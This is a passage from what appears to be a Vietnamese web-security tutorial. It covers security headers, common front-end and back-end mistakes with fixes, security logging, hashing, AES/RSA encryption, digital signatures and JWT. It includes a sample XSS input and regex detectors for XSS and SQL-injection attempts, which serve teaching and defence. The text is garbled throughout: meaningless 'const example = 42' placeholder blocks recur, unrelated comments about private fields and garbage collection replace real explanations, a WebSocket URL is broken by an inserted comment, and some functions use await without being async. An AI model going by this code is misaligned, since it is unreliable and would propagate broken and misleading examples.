  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );

 // Chú giải: X-Frame-Options
  res.setHeader('X-Frame-Options', 'DENY');

 // Chú giải: X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

 // Chú giải: Referrer-Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  // Permissions-Policy (tắt features không dùng)
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'  // Tắt location, mic, camera
  );

  next();
});

// 📋 BẢNG TÓM TẮT SECURITY HEADERS
/*
┌────────────────────────────┬──────────────────────────────────────────┐
│ Header                     │ Mục Đích                                 │
├────────────────────────────┼──────────────────────────────────────────┤
│ Content-Security-Policy    │ Kiểm soát nguồn scripts, styles, images  │
│ X-Frame-Options            │ Chống Clickjacking (iframe embed)        │
│ X-Content-Type-Options     │ Chống MIME type sniffing                 │
│ Referrer-Policy            │ Kiểm soát thông tin referrer             │
│ Strict-Transport-Security  │ Bắt buộc HTTPS                           │
│ X-XSS-Protection           │ Enable browser XSS filter (legacy)       │
│ Permissions-Policy         │ Tắt browser features không dùng          │
└────────────────────────────┴──────────────────────────────────────────┘
*/

// ✅ Kiểm tra headers:
 // Chú giải: 1. Mở DevTools → Network tab
// 2. Chọn request bất kỳ
 // Chú giải: 3. Xem Response Headers
// 4. Hoặc dùng https://securityheaders.com để scan

// VÍ DỤ RESPONSE HEADERS:
/*
HTTP/2 200
content-security-policy: default-src 'self'
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains; preload
*/

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ✅ Security Checklist cho Trading Platform

const securityChecklist = {
  transport: {
    https: true,
    hsts: true,
    tlsVersion: 'TLS 1.3',
    certificateExpiry: 'Valid',
  },

  xssPrevention: {
    inputSanitization: true,
    outputEncoding: true,
    cspHeaders: true,
    dompurify: true,
  },

  csrfProtection: {
    csrfTokens: true,
    sameSiteCookies: true,
    customHeaders: true,
  },

  authentication: {
    jwtTokens: true,
    refreshTokens: true,
    tokenExpiry: '15m',
    passwordHashing: 'bcrypt',
  },

  storage: {
    noSensitiveLocalStorage: true,
    httpOnlyCookies: true,
    encryptedData: true,
  },

  apiSecurity: {
    rateLimiting: true,
    inputValidation: true,
    cors: true,
    apiKeys: true,
  },

  headers: {
    contentSecurityPolicy: true,
    xFrameOptions: true,
    xContentTypeOptions: true,
    referrerPolicy: true,
  },
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ LỖI 1: Lưu tokens trong localStorage
// Vấn đề: XSS có thể đọc localStorage → steal token
localStorage.setItem('token', token); // ❌ Nguy hiểm!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!

// ✅ CÁCH SỬA: Dùng HttpOnly cookies
 // Chú giải: Server:
res.cookie('refreshToken', token, {
  httpOnly: true, // JavaScript không đọc được
  secure: true, // Chú giải: Chỉ gửi qua HTTPS
  sameSite: 'strict', // Chú giải: Chống CSRF
});
// Client: Không cần làm gì, browser tự động gửi cookie

// ❌ LỖI 2: Không sanitize user input
// Vấn đề: User nhập <script>alert('XSS')</script> → script chạy
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ❌ Nguy hiểm!
}

// ✅ CÁCH SỬA: Dùng DOMPurify sanitize
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // Chỉ cho phép tags an toàn
    ALLOWED_ATTR: [], // Không cho phép attributes
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // ✅ An toàn
}

// ❌ LỖI 3: Không có CSRF protection
// Vấn đề: Hacker lừa user click link → browser gửi request kèm cookies
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 }),
}); // ❌ Thiếu CSRF token

// ✅ CÁCH SỬA: Gửi CSRF token
 // Chú giải: 1. Lấy token từ server
const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());

// 2. Gửi token cùng request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken.token, // Chú giải: ✅ Gửi token
  },
  body: JSON.stringify({ amount: 1000, csrfToken: csrfToken.token }),
});

// ❌ LỖI 4: Password yếu
// Vấn đề: Password ngắn → dễ brute-force
const isValid = password.length >= 6; // ❌ Quá yếu (123456, password)

// ✅ CÁCH SỬA: Password policy mạnh
// Regex: Ít nhất 12 ký tự, có chữ thường, chữ hoa, số, ký tự đặc biệt
const passwordRegex =
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;

function validatePassword(password: string): boolean {
  if (!passwordRegex.test(password)) {
    throw new Error(
      'Password phải có ít nhất 12 ký tự, bao gồm chữ hoa, chữ thường, số và ký tự đặc biệt'
    );
  }
  return true;
}

// VD: "Pass123!" → ❌ Fail (chỉ 8 ký tự)
 // Chú giải: "MySecurePass123!" → ✅ Pass

// ❌ LỖI 5: Không có rate limiting
// Vấn đề: Hacker thử 1 triệu passwords trong vài phút
app.post('/api/login', async (req, res) => {
  // ❌ Không giới hạn → brute-force dễ dàng
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ✅ CÁCH SỬA: Thêm rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chú giải: Chỉ cho 5 lần thử
  message: 'Quá nhiều lần thử login, vui lòng thử lại sau 15 phút',
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // ✅ Giới hạn 5 lần/15 phút → brute-force khó hơn
  const user = await authenticateUser(req.body);
  res.json(user);
});

 // Chú giải: ❌ LỖI 6: Hardcode secrets trong code
// Vấn đề: Secret bị lộ khi push lên GitHub
const JWT_SECRET = 'my-secret-key-123'; // ❌ Nguy hiểm!
const API_KEY = 'sk_live_abc123xyz'; // Chú giải: ❌ Lộ API key

// ✅ CÁCH SỬA: Dùng environment variables
 // Chú giải: File: .env
 // Chú giải: JWT_SECRET=randomly-generated-secure-key-xyz789
 // Chú giải: API_KEY=sk_live_abc123xyz

 // Chú giải: Code:
const JWT_SECRET = process.env.JWT_SECRET; // ✅ Đọc từ env
const API_KEY = process.env.API_KEY;

// .gitignore phải có .env để không commit secrets

 // Chú giải: ❌ LỖI 7: CORS wildcard trong production
// Vấn đề: Cho phép mọi domain call API
app.use(cors({ origin: '*' })); // ❌ Mọi domain đều gọi được

// ✅ CÁCH SỬA: Whitelist domains cụ thể
app.use(
  cors({
    origin: ['https://yourdomain.com', 'https://app.yourdomain.com'], // ✅ Chỉ cho phép domains này
    credentials: true,
  })
);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ✅ Security Event Logging System
// Mục đích: Phát hiện và theo dõi các hoạt động bất thường

import winston from 'winston'; // Thư viện logging mạnh mẽ

// Cấu hình logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Ghi vào file
    new winston.transports.File({ filename: 'security.log' }),
    // Gửi đến service giám sát (VD: Elasticsearch, Datadog)
    new winston.transports.Http({ host: 'logs.example.com' }),
  ],
});

 // Chú giải: 1. Log Failed Login Attempts (Lần Thử Login Thất Bại)
// Phát hiện brute-force attack
function logFailedLogin(email: string, ip: string, timestamp: Date) {
  securityLogger.warn({
    event: 'FAILED_LOGIN',
    email,
    ip,
    timestamp,
    message: `Thử login thất bại: ${email} từ IP ${ip}`,
  });

  // Kiểm tra số lần thử thất bại
  const failedAttempts = await getFailedAttempts(ip, email);

  if (failedAttempts >= 5) {
    securityLogger.error({
      event: 'BRUTE_FORCE_DETECTED',
      email,
      ip,
      attempts: failedAttempts,
      message: `⚠️ Phát hiện brute-force: ${failedAttempts} lần thử từ ${ip}`,
    });

 // Chú giải: Block IP tạm thời
    await blockIP(ip, 3600); // Chú giải: Block 1 giờ

 // Chú giải: Gửi alert cho security team
    await sendAlert('security@example.com', `Brute-force detected: ${ip}`);
  }
}

// 2. Log Suspicious Activity (Hoạt Động Đáng Ngờ)
// VD: User truy cập nhiều accounts, transfer số tiền bất thường
function logSuspiciousActivity(userId: string, action: string, details: any) {
  securityLogger.warn({
    event: 'SUSPICIOUS_ACTIVITY',
    userId,
    action,
    details,
    timestamp: new Date(),
    message: `Hoạt động đáng ngờ: User ${userId} - ${action}`,
  });

  // VD: Transfer số tiền lớn bất thường
  if (action === 'LARGE_TRANSFER' && details.amount > 100000) {
    // Gửi OTP xác nhận
    await sendOTP(userId);

 // Chú giải: Alert security team
    await sendAlert(
      'security@example.com',
      `Large transfer detected: User ${userId} - $${details.amount}`
    );
  }
}

// 3. Log XSS Attempts (Thử Tấn Công XSS)
// Phát hiện khi user nhập script tags hoặc malicious code
function logXSSAttempt(input: string, ip: string, userId?: string) {
  // Detect script tags hoặc javascript: protocol
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;

  if (xssPattern.test(input)) {
    securityLogger.error({
      event: 'XSS_ATTEMPT',
      ip,
      userId: userId || 'anonymous',
      input: input.substring(0, 200), // Chỉ log 200 ký tự đầu
      timestamp: new Date(),
      message: `⚠️ Phát hiện XSS attempt từ IP ${ip}`,
    });

 // Chú giải: Block IP ngay lập tức
    await blockIP(ip, 86400); // Chú giải: Block 24 giờ

 // Chú giải: Alert admin
    await sendAlert(
      'admin@example.com',
      `XSS attempt from ${ip}: ${input.substring(0, 100)}...`
    );
  }
}

 // Chú giải: 4. Log SQL Injection Attempts
function logSQLInjectionAttempt(query: string, ip: string) {
  const sqlPattern = /(\bOR\b|\bAND\b).*=.*|UNION|DROP|DELETE|INSERT/i;

  if (sqlPattern.test(query)) {
    securityLogger.error({
      event: 'SQL_INJECTION_ATTEMPT',
      ip,
      query: query.substring(0, 200),
      timestamp: new Date(),
      message: `⚠️ SQL injection attempt từ ${ip}`,
    });

    await blockIP(ip, 86400);
  }
}

 // Chú giải: 5. Log Authentication Events
function logAuthEvent(
  event: string,
  userId: string,
  ip: string,
  success: boolean
) {
  securityLogger.info({
    event: 'AUTH_EVENT',
    type: event, // Chú giải: 'LOGIN', 'LOGOUT', 'TOKEN_REFRESH', 'PASSWORD_CHANGE'
    userId,
    ip,
    success,
    timestamp: new Date(),
    message: `${event}: User ${userId} từ ${ip} - ${
      success ? 'Thành công' : 'Thất bại'
    }`,
  });
}

 // Chú giải: 6. Real-time Monitoring Dashboard
// Hiển thị logs real-time cho security team
import { Server } from 'socket.io';

const io = new Server(server);

// Gửi security events real-time đến dashboard
securityLogger.on('data', (logEntry) => {
  if (logEntry.level === 'error' || logEntry.level === 'warn') {
    // Emit đến security dashboard
    io.to('security-room').emit('security-alert', logEntry);
  }
});

 // Chú giải: Dashboard component (React)
function SecurityDashboard() {
  const [alerts, setAlerts] = useState<any[]>([]);

  useEffect(() => {
    const socket = io('wss: // Chú giải: your-server.com');
    socket.emit('join', 'security-room');

    socket.on('security-alert', (alert) => {
      setAlerts((prev) => [alert, ...prev].slice(0, 100)); // Chú giải: Keep 100 alerts

 // Chú giải: Play sound for critical alerts
      if (
        alert.event === 'BRUTE_FORCE_DETECTED' ||
        alert.event === 'XSS_ATTEMPT'
      ) {
        playAlertSound();
      }
    });

    return () => socket.disconnect();
  }, []);

  return (
    <div className="security-dashboard">
      <h2>🛡️ Security Monitoring Dashboard</h2>
      {alerts.map((alert, i) => (
        <div key={i} className={`alert alert-${alert.level}`}>
          <span className="time">{alert.timestamp}</span>
          <span className="event">{alert.event}</span>
          <span className="message">{alert.message}</span>
        </div>
      ))}
    </div>
  );
}

// 📊 METRICS TRACKING (Theo dõi chỉ số)
interface SecurityMetrics {
  totalRequests: number;
  failedLogins: number;
  xssAttempts: number;
  sqlInjectionAttempts: number;
  blockedIPs: number;
}

 // Chú giải: Track metrics theo thời gian
const metrics: SecurityMetrics = {
  totalRequests: 0,
  failedLogins: 0,
  xssAttempts: 0,
  sqlInjectionAttempts: 0,
  blockedIPs: 0,
};

// Gửi metrics đến monitoring service (VD: Prometheus, Grafana)
setInterval(() => {
  sendMetrics('security.metrics', metrics);
  console.log('📊 Security Metrics:', metrics);
}, 60000); // Mỗi phút

```js
// Ví dụ rút gọn
const example = 42;
```

INPUT (bất kỳ độ dài) → HASH FUNCTION → OUTPUT (fixed length)

"password123"     →  bcrypt  →  "$2b$10$N9qo8uLO..."  (60 chars)
"myfile.pdf"      →  SHA-256 →  "e3b0c44298fc1c..." (64 hex chars)
"Hello World"     →  SHA-256 →  "a591a6d40bf420..." (64 hex chars)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   hash('password123') === hash('password123'); // ✅ Luôn giống nhau

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   hash("password123")  → "e3b0c44298fc1c..."
   hash("password124")  → "92cf3b8ec0a8d7..."  // Hoàn toàn khác!
   // Chỉ thay đổi 1 ký tự → hash hoàn toàn khác

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   hash("Hi")           → 64 hex chars (SHA-256)
   hash("Very long...") → 64 hex chars (SHA-256)
   // Input bất kỳ → output luôn 64 chars

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ VẤN ĐỀ: Lưu plaintext password
Database: { email: "user@example.com", password: "mypassword123" }
// Nếu hacker hack database → biết ngay password!

// ✅ GIẢI PHÁP: Hash password
Database: { email: "user@example.com", password: "$2b$10$N9qo8uLO..." }
// Hacker chỉ thấy hash, KHÔNG thể reverse về password!

 // Chú giải: KHI LOGIN:
const userInput = "mypassword123";
const storedHash = "$2b$10$N9qo8uLO...";

// So sánh: hash(userInput) === storedHash?
const isValid = bcrypt.compare(userInput, storedHash);  // ✅ true nếu đúng

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ KHÔNG DÙNG SALT:
hash("password123") → "e3b0c44298fc1c..."  // Luôn giống nhau
// Hacker tạo Rainbow Table (bảng hash sẵn của triệu passwords phổ biến)
// Tra ngược: "e3b0c44298fc1c..." → "password123"  ✅ Tìm được!

// ✅ DÙNG SALT:
hash("password123" + "randomSalt1") → "$2b$10$abc..."
hash("password123" + "randomSalt2") → "$2b$10$xyz..."
// Mỗi user có salt khác nhau → cùng password cũng khác hash
// Rainbow Table KHÔNG dùng được! (vì phải tạo bảng cho mỗi salt)

```js
// Ví dụ rút gọn
const example = 42;
```

PLAINTEXT + KEY → [ENCRYPT] → CIPHERTEXT
CIPHERTEXT + KEY → [DECRYPT] → PLAINTEXT

Ví dụ:
"Hello World" + key123 → [AES Encrypt] → "6Kq8z3Xp..."
"6Kq8z3Xp..." + key123 → [AES Decrypt] → "Hello World"

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ALICE (Sender):
const message = 'Meet me at 3pm';
const secretKey = 'shared-secret-key-123'; // ⚠️ Alice và Bob đều biết key này

const encrypted = AES.encrypt(message, secretKey); // Chú giải: "6Kq8z3Xp..."
 // Chú giải: Alice gửi encrypted message cho Bob

 // Chú giải: BOB (Receiver):
const received = '6Kq8z3Xp...';
const secretKey = 'shared-secret-key-123'; // ⚠️ Bob phải có CÙNG key

const decrypted = AES.decrypt(received, secretKey); // Chú giải: "Meet me at 3pm"
console.log(decrypted); // ✅ Bob đọc được message

```js
// Ví dụ rút gọn
const example = 42;
```

Alice và Bob cách nhau 1000km, làm sao chia sẻ secretKey an toàn?
- Gửi qua email? ❌ Email có thể bị intercept
- Gửi qua SMS? ❌ SMS không mã hóa
- Nói điện thoại? ❌ Điện thoại có thể bị nghe lén

→ Giải pháp: Dùng ASYMMETRIC ENCRYPTION để trao đổi symmetric key!

```js
// Ví dụ rút gọn
const example = 42;
```

AES-256:  Encrypt 1GB file trong ~1 giây
RSA-2048: Encrypt 1GB file trong ~10 phút!

→ HTTPS flow:
1. Handshake: Dùng RSA trao đổi AES key (chỉ ~32 bytes)
2. Data Transfer: Dùng AES encrypt data (nhanh!)

```js
// Ví dụ rút gọn
const example = 42;
```

2 KEYS: Public Key (công khai) + Private Key (bí mật)

ENCRYPT với PUBLIC KEY → Decrypt với PRIVATE KEY
PLAINTEXT + Public Key  → [ENCRYPT] → CIPHERTEXT
CIPHERTEXT + Private Key → [DECRYPT] → PLAINTEXT

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: BOB tạo key pair:
const bobKeys = generateRSAKeyPair();
 // Chú giải: bobKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share freely)
 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.

 // Chú giải: Bob gửi PUBLIC KEY cho Alice (qua email, website, anywhere)
// ⚠️ Public key KHÔNG sợ bị lộ! Ai cũng biết được!

 // Chú giải: ALICE (Sender):
const message = 'Meet me at 3pm';
const encrypted = RSA.encrypt(message, bobKeys.publicKey); // Dùng Bob's PUBLIC KEY
 // Chú giải: encrypted = "f8Kq3z..."

// ⚠️ Chỉ Bob mới decrypt được (vì chỉ Bob có PRIVATE KEY)
// Alice KHÔNG thể decrypt (dù Alice là người encrypt!)

 // Chú giải: BOB (Receiver):
const decrypted = RSA.decrypt(encrypted, bobKeys.privateKey); // Dùng Bob's PRIVATE KEY
console.log(decrypted); // Chú giải: "Meet me at 3pm" ✅

```js
// Ví dụ rút gọn
const example = 42;
```

Alice muốn gửi message cho Bob:

CÁCH CŨ (Symmetric):
1. Alice và Bob phải gặp nhau để trao đổi secret key  ❌ Không tiện
2. Hoặc gửi key qua kênh không an toàn  ❌ Nguy hiểm

CÁCH MỚI (Asymmetric):
1. Bob tạo key pair (public + private)
2. Bob share public key lên website/email (KHÔNG sợ lộ!)
3. Alice lấy Bob's public key
4. Alice encrypt message với Bob's public key
5. Gửi encrypted message cho Bob
6. Bob decrypt với private key (chỉ Bob có!)

✅ KHÔNG cần gặp nhau!
✅ KHÔNG cần trao đổi secret key!
✅ Public key bị lộ cũng KHÔNG sao!

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ENCRYPTION (Mã hóa - Protect Confidentiality):
Sender   encrypt với RECEIVER's PUBLIC KEY
Receiver decrypt với RECEIVER's PRIVATE KEY

Ví dụ: Alice gửi message cho Bob
Alice:  encrypt(message, Bob's PUBLIC KEY)   → ciphertext
Bob:    decrypt(ciphertext, Bob's PRIVATE KEY) → message

// DIGITAL SIGNATURE (Chữ ký số - Prove Authenticity):
Signer  sign với SIGNER's PRIVATE KEY
Verifier verify với SIGNER's PUBLIC KEY

Ví dụ: Alice ký document
Alice:  sign(document, Alice's PRIVATE KEY)   → signature
Bob:    verify(document, signature, Alice's PUBLIC KEY) → ✅ valid

```js
// Ví dụ rút gọn
const example = 42;
```

SIGN (Ký):
1. Hash document với SHA-256 → hash
2. Encrypt hash với PRIVATE KEY → signature
3. Gửi document + signature

VERIFY (Xác thực):
1. Hash received document → hash1
2. Decrypt signature với PUBLIC KEY → hash2
3. Compare hash1 === hash2 ?
- ✅ Match → Document valid, không bị tamper
- ❌ Not match → Document bị thay đổi hoặc signature giả

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ALICE tạo key pair:
const aliceKeys = generateRSAKeyPair();
 // Chú giải: aliceKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share)
 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.

// ALICE KÝ CONTRACT:
const contract = 'I agree to pay $10000 to Bob';

 // Chú giải: Bước 1: Hash contract
const hash = SHA256(contract); // Chú giải: "e3b0c44298fc1c..."

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
const signature = RSA.encrypt(hash, aliceKeys.privateKey); // Chú giải: "f8Kq3z..."

 // Chú giải: Alice gửi cho Bob: contract + signature + Alice's public key

 // Chú giải: BOB VERIFY SIGNATURE:
const receivedContract = 'I agree to pay $10000 to Bob';
const receivedSignature = 'f8Kq3z...';
const alicePublicKey = '-----BEGIN PUBLIC KEY-----...';

 // Chú giải: Bước 1: Hash received contract
const hash1 = SHA256(receivedContract); // Chú giải: "e3b0c44298fc1c..."

 // Chú giải: Bước 2: Decrypt signature với PUBLIC KEY
const hash2 = RSA.decrypt(receivedSignature, alicePublicKey); // Chú giải: "e3b0c44298fc1c..."

 // Chú giải: Bước 3: Compare
if (hash1 === hash2) {
  console.log('✅ Signature valid!');
  console.log('✅ Contract từ Alice (vì chỉ Alice có private key)');
  console.log('✅ Contract không bị thay đổi (vì hash khớp)');
} else {
  console.log('❌ Signature invalid!');
  console.log('❌ Contract bị tamper hoặc signature giả!');
}

```js
// Ví dụ rút gọn
const example = 42;
```

RSA SLOW:
- Sign toàn bộ contract (10 pages) → 10 giây
- Sign hash của contract (64 chars)  → 0.01 giây

Hash UNIQUE:
- 2 documents khác nhau → 2 hashes khác nhau
- 1 document thay đổi 1 ký tự → hash hoàn toàn khác
→ Verify hash = verify toàn bộ document!

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ENCRYPTION (Mã hóa):
Mục đích: Protect CONFIDENTIALITY (bảo mật)
Encrypt với: RECEIVER's PUBLIC KEY
Decrypt với: RECEIVER's PRIVATE KEY
Result: Chỉ receiver đọc được message

Ví dụ: Alice gửi secret message cho Bob
Alice:  encrypt(message, Bob's PUBLIC)    → Bob decrypt với Bob's PRIVATE
        ↑ Dùng Bob's keys!

// DIGITAL SIGNATURE (Chữ ký số):
Mục đích: Prove AUTHENTICITY & INTEGRITY (xác thực & toàn vẹn)
Sign với: SIGNER's PRIVATE KEY
Verify với: SIGNER's PUBLIC KEY
Result: Mọi người verify được message từ signer

Ví dụ: Alice ký contract
Alice:  sign(contract, Alice's PRIVATE)   → Bob verify với Alice's PUBLIC
        ↑ Dùng Alice's keys!

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: SERVER (Sign JWT):
const payload = { userId: '123', role: 'admin' };
const privateKey = '-----BEGIN PRIVATE KEY-----...';

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });
 // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.

 // Chú giải: CLIENT/API (Verify JWT):
const publicKey = '-----BEGIN PUBLIC KEY-----...';

try {
  const verified = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
  console.log('✅ Token valid:', verified);
  // ✅ Token từ server (vì chỉ server có private key)
  // ✅ Payload không bị thay đổi (vì signature valid)
} catch (error) {
  console.log('❌ Token invalid:', error.message);
  // ❌ Token bị tamper hoặc signature giả
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: HS256 (HMAC with SHA-256):
- Symmetric: 1 secret key (server giữ)
- Sign: HMAC(payload, secret)
- Verify: HMAC(payload, secret)
⚠️ VẤN ĐỀ: Client KHÔNG verify được (không có secret key)
⚠️ Nếu client có secret → client có thể forge tokens!

 // Chú giải: RS256 (RSA with SHA-256):
- Asymmetric: Private key (server) + Public key (share)
- Sign: RSA(hash(payload), privateKey)
- Verify: RSA(signature, publicKey)
✅ Client verify được (có public key)
✅ Client KHÔNG thể forge tokens (không có private key)
✅ Microservices verify được (share public key)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import bcrypt from 'bcrypt';

 // Chú giải: =====================================
 // Chú giải: PASSWORD HASHING WITH BCRYPT
 // Chú giải: =====================================

// 🔹 REGISTER - Hash password khi user đăng ký
async function registerUser(email: string, password: string) {
  // Salt rounds = độ phức tạp (10 = 2^10 = 1024 iterations)
  // Càng cao càng secure nhưng càng chậm
  const saltRounds = 10;

  // bcrypt tự động generate salt và combine với hash
  const hashedPassword = await bcrypt.hash(password, saltRounds);

  // Lưu vào database
  await db.users.create({
    email,
    password: hashedPassword, // Chú giải: VD: $2b$10$Xu... (60 chars)
  });

  console.log('Original:', password); // Chú giải: "MySecurePass123"
  console.log('Hashed:', hashedPassword); // Chú giải: "$2b$10$Xu4K..."
  // ⚠️ Không thể reverse từ hash về password!
}

// 🔹 LOGIN - Verify password khi user đăng nhập
async function loginUser(email: string, password: string) {
 // Chú giải: Lấy user từ database
  const user = await db.users.findByEmail(email);

  if (!user) {
    throw new Error('User not found');
  }

  // So sánh password với hash (bcrypt.compare tự extract salt)
  const isValid = await bcrypt.compare(password, user.password);

  if (!isValid) {
    throw new Error('Invalid password');
  }

  // Generate JWT token nếu password đúng
  const token = generateJWT(user.id);
  return { user, token };
}

// 🔹 CHANGE PASSWORD - Hash lại khi user đổi mật khẩu
async function changePassword(
  userId: string,
  oldPassword: string,
  newPassword: string
) {
  const user = await db.users.findById(userId);

 // Chú giải: Verify old password
  const isValid = await bcrypt.compare(oldPassword, user.password);
  if (!isValid) {
    throw new Error('Old password is incorrect');
  }

 // Chú giải: Hash new password
  const newHashedPassword = await bcrypt.hash(newPassword, 10);

 // Chú giải: Update database
  await db.users.update(userId, {
    password: newHashedPassword,
    passwordChangedAt: new Date(),
  });
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import crypto from 'crypto';

 // Chú giải: =====================================
 // Chú giải: SHA-256 FOR DATA INTEGRITY
 // Chú giải: =====================================

// 🔹 FILE CHECKSUM - Verify file không bị thay đổi
function generateFileChecksum(fileContent: Buffer): string {
  return crypto.createHash('sha256').update(fileContent).digest('hex'); // Chú giải: 64 hex chars (256 bits)
}

 // Chú giải: Example: Download file verification
async function downloadAndVerify(url: string, expectedChecksum: string) {
  const fileContent = await downloadFile(url);
  const actualChecksum = generateFileChecksum(fileContent);

  if (actualChecksum !== expectedChecksum) {
    throw new Error('File corrupted! Checksum mismatch');
  }

  console.log('✅ File verified successfully');
  return fileContent;
}

 // Chú giải: 🔹 GENERATE UNIQUE TOKEN - Session ID, API keys
function generateSessionToken(userId: string): string {
  const timestamp = Date.now().toString();
  const random = crypto.randomBytes(16).toString('hex');

  // Hash combination để tạo unique token
  return crypto
    .createHash('sha256')
    .update(`${userId}:${timestamp}:${random}`)
    .digest('hex');
}

 // Chú giải: 🔹 HMAC - Hash with secret key (for API signatures)
function generateHMAC(data: string, secretKey: string): string {
  return crypto.createHmac('sha256', secretKey).update(data).digest('hex');
}

 // Chú giải: Example: Verify webhook payload từ third-party service
function verifyWebhook(
  payload: string,
  signature: string,
  secret: string
): boolean {
  const expectedSignature = generateHMAC(payload, secret);
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: SYMMETRIC (AES): 1 key cho cả encrypt & decrypt
const key = 'shared-secret-key';
const encrypted = AES.encrypt('data', key); // Chú giải: Encrypt với key
const decrypted = AES.decrypt(encrypted, key); // Decrypt với CÙNG key
// ⚠️ Vấn đề: Làm sao gửi key an toàn?

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
const { publicKey, privateKey } = generateKeys();
const encrypted = RSA.encrypt('data', publicKey); // Chú giải: Encrypt với PUBLIC key
const decrypted = RSA.decrypt(encrypted, privateKey); // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
// ✅ Giải pháp: Public key share thoải mái, chỉ private key giữ bí mật!

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import crypto from 'crypto';

 // Chú giải: =====================================
 // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.
 // Chú giải: =====================================

interface EncryptedData {
  iv: string; // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.
  encryptedText: string; // Chú giải: Ciphertext
  authTag: string; // Chú giải: Authentication Tag (16 bytes)
}

// 🔹 ENCRYPT - Mã hóa dữ liệu với AES-256-GCM
function encryptAES(plaintext: string, secretKey: string): EncryptedData {
 // Chú giải: Generate random IV (Initialization Vector)
  // ⚠️ PHẢI random mỗi lần encrypt, KHÔNG reuse!
  const iv = crypto.randomBytes(12);

 // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.
 // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.
  const cipher = crypto.createCipheriv(
    'aes-256-gcm',
    Buffer.from(secretKey, 'hex'), // Chú giải: 32 bytes (256 bits)
    iv
  );

 // Chú giải: Encrypt plaintext
  let encryptedText = cipher.update(plaintext, 'utf8', 'hex');
  encryptedText += cipher.final('hex');

 // Chú giải: Get authentication tag (verify integrity khi decrypt)
  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encryptedText,
    authTag: authTag.toString('hex'),
  };
}

// 🔹 DECRYPT - Giải mã dữ liệu
function decryptAES(encrypted: EncryptedData, secretKey: string): string {
 // Chú giải: Create decipher
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    Buffer.from(secretKey, 'hex'),
    Buffer.from(encrypted.iv, 'hex')
  );

  // Set authentication tag (verify không bị tamper)
  decipher.setAuthTag(Buffer.from(encrypted.authTag, 'hex'));

 // Chú giải: Decrypt ciphertext
  let plaintext = decipher.update(encrypted.encryptedText, 'hex', 'utf8');
  plaintext += decipher.final('utf8');

  return plaintext;
}

 // Chú giải: 🔹 EXAMPLE - Encrypt PII trong database
interface User {
  id: string;
  email: string; // Chú giải: Plaintext (for login)
  phone: string; // Chú giải: Encrypted (sensitive PII)
  ssn: string; // Chú giải: Encrypted (very sensitive)
}

async function saveUser(user: User, encryptionKey: string) {
  const encryptedPhone = encryptAES(user.phone, encryptionKey);
